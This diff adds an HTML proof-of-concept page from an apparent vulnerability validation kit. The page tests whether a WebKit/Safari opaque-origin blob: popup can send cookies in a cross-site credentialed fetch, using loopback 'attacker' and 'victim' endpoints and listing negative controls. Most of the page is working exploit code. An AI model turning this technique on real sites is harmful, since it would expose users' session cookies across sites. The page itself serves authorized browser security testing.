@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<!--
+  WC-2026-005 validation kit — attacker page (LOCAL-ONLY test fixture)
+
+  Purpose: demonstrate the candidate chain in an authorized local WebKit/Safari
+  test environment. This page embeds an OPAQUE-ORIGIN sandboxed iframe
+  (sandbox="allow-scripts allow-popups" WITHOUT allow-same-origin). The iframe
+  creates a blob:null/<uuid> payload and opens it as a popup ONLY after a
+  visible user click (popup blockers require a user gesture).
+
+  The popup's blob document then issues a credentialed fetch to the local
+  victim-origin endpoint served by server.py. The server logs whether the
+  request carried the test cookie.
+
+  This is a LOCAL-ONLY fixture: no real domains, no real accounts, no real
+  cookies, no third-party services. All endpoints are 127.0.0.1.
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<title>WC-2026-005 local validation fixture</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 2em; }
+  #status { margin: 1em 0; padding: 0.5em; border: 1px solid #ccc; min-height: 1.5em; }
+  button { font-size: 1.2em; padding: 0.5em 1em; }
+</style>
+</head>
+<body>
+<h1>WC-2026-005 — opaque-origin blob: popup cookie-blocking check</h1>
+<p>This page embeds a sandboxed iframe (opaque origin). The iframe creates a
+<code>blob:null/&lt;uuid&gt;</code> payload and opens it as a popup when you
+click the button below. The popup then fetches the local victim endpoint.</p>
+
+<div id="status">Ready. Press Tab then Enter (or click) inside the iframe to run the candidate case.</div>
+<button id="run" tabindex="-1">Open opaque blob: popup (candidate case)</button>
+
+<script>
+// Separate site identities (both loopback, researcher-controlled):
+//   attacker page  = http://127.0.0.1:8000  (this page)
+//   victim origin  = http://127.0.0.2:8765  (different loopback IP => different site)
+const VICTIM = 'http://127.0.0.2:8765/victim';   // local victim-origin endpoint (server.py --role victim)
+const LOG = 'http://127.0.0.1:8000/log';          // local log endpoint (server.py --role attacker)
+
+// The opaque-origin iframe. sandbox WITHOUT allow-same-origin => opaque origin.
+// allow-scripts + allow-popups are required so the iframe can run JS and open
+// the popup. The popup is opened from a user click INSIDE the iframe.
+const iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts allow-popups';
+iframe.srcdoc = `
+  <!DOCTYPE html>
+  <html><body>
+    <button id="go" style="font-size:1.5em;padding:0.5em 1em;">Click to open blob: popup</button>
+    <script>
+      document.getElementById('go').addEventListener('click', function () {
+        // Create a blob:null/<uuid> payload (opaque origin because this
+        // document's origin is opaque).
+        var payload = '<!DOCTYPE html><html><body>' +
+          '<script>' +
+          'fetch("${VICTIM}", {credentials: "include"})' +
+          '.then(function(r){ return r.text(); })' +
+          '.then(function(t){ window.opener.postMessage("POPUP_FETCH_DONE " + t, "*"); })' +
+          '.catch(function(e){ window.opener.postMessage("POPUP_FETCH_ERR " + e, "*"); });' +
+          '<\\/script>' +
+          '</body></html>';
+        var blob = new Blob([payload], {type: 'text/html'});
+        var url = URL.createObjectURL(blob);
+        // Report the blob URL scheme+origin shape to the parent for logging.
+        window.parent.postMessage('BLOB_URL ' + url, '*');
+        // Open the popup. User gesture present (click handler).
+        var w = window.open(url, '_blank');
+        if (!w) { window.parent.postMessage('POPUP_BLOCKED', '*'); }
+      });
+    <\\/script>
+  </body></html>
+`;
+document.body.appendChild(iframe);
+
+// Listen for messages from the iframe and the popup.
+window.addEventListener('message', function (e) {
+  var status = document.getElementById('status');
+  status.textContent = '[' + new Date().toISOString() + '] ' + e.data;
+  // Forward to the local log endpoint (no sensitive data; local only).
+  fetch(LOG + '?msg=' + encodeURIComponent(e.data), {mode: 'no-cors'}).catch(function(){});
+});
+</script>
+
+<hr>
+<h2>Negative controls (run manually, one at a time)</h2>
+<p><strong>Control 1 — non-opaque blob:</strong> replace the iframe above with
+one that has <code>sandbox="allow-same-origin allow-scripts allow-popups"</code>
+(keeps the parent origin, so the blob URL is <code>blob:http://127.0.0.1:8765/&lt;uuid&gt;</code>).
+Expected: the popup's cross-site fetch to the victim endpoint is BLOCKED from
+carrying cookies (decision All).</p>
+<p><strong>Control 2 — ordinary third-party:</strong> from the top page, fetch
+<code>${VICTIM}</code> with <code>credentials:'include'</code> directly.
+Expected: BLOCKED from carrying cookies (cross-site, non-empty domains).</p>
+<p><strong>Control 3 — first-party:</strong> from the top page, fetch
+<code>http://127.0.0.1:8765/</code> (same origin). Expected: cookie IS sent
+(first-party).</p>
+</body>
+</html>
